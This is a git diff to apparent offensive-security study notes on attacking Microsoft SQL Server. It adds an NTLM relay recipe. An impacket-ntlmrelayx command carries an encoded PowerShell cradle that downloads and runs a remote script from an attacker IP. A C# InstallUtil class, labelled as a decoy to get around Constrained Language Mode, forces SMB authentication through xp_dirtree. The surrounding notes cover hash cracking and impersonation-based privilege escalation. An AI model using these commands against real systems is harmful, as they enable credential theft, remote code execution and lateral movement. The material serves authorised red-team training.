@@ -190,11 +190,11 @@ Follow guide [here](https://hex64.net/blog/how-to-recover-sa-password-on-microso
 
 1. Go to Sql Server Configuration Manager
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (1).png>)
 
 2. Stop the SQL server
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (1).png>)
 
 3. Right click --> Properties
 
@@ -416,10 +416,68 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 * Net-NTLM hash (NTLMv2) can't be used for pass-the-hash attack
 * Can be used for relay attacks tho
 
-- Generate [powershell shellcode runner b64 command](../good-exploit-code/osep-good-code.md#powershell-shellcode-runner)
-- Force SMB request from SQL server --> Relay it to APPSRV01
+- Generate [simple powershell rev shell b64 command](../exploitation/clm-bypass.md#unprivileged-bypass-using-installutil-bypass_clm_rev_shell.exe)
+- Relay it to APPSRV01 (Always use FQDN instead of IP addr)
   * ```bash
     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <Dest IP of the relay> -c 'powershell -enc cG93ZXJzaGVsbCAtYyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjQ1LjE5Ny9ydW5hbGwucHMxJyk='
+    # sudo proxychains4 impacket-ntlmrelayx  --no-http-server -smb2support -t sql05.example.com:445 -c "powershell -e SQBFAFgAI.."
+    ```
+
+* Force SMB request from SQL server
+  * ```csharp
+    using System;
+    using System.Management.Automation;
+    using System.Management.Automation.Runspaces;
+    using System.Configuration.Install;
+    using System.Runtime.InteropServices;
+    using System.Data.SqlClient;
+
+    namespace custom_installutil
+    {
+        
+        internal class Program
+        {
+            static void Main(string[] args)
+            {
+                Console.WriteLine("This is the main method which is a decoy");
+            }
+        }
+
+        [System.ComponentModel.RunInstaller(true)]
+        public class Sample : System.Configuration.Install.Installer
+        {
+            public override void Uninstall(System.Collections.IDictionary savedState)
+            {
+
+                String sqlServer = "sql07.example.com";
+                String database = "master";
+                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+
+                SqlConnection con = new SqlConnection(conString);
+
+                try
+                {
+                    con.Open();
+                    Console.WriteLine("Auth success!");
+                }
+                catch
+                {
+                    Console.WriteLine("Auth failed");
+                    Environment.Exit(0);
+                }
+
+                //WRITE CODE HERE!
+                String query = "EXEC master..xp_dirtree \"\\\\192.168.45.170\\\\test\";";
+                SqlCommand command = new SqlCommand(query, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+                //END OF CODE!
+
+                con.Close();
+            }
+        }
+    }
+
     ```
 
 </details>
@@ -428,7 +486,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 <summary>Privilege Escalation</summary>
 
-* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png>)
+* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png>)
   *   ```csharp
       String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
       SqlCommand command = new SqlCommand(query, con);
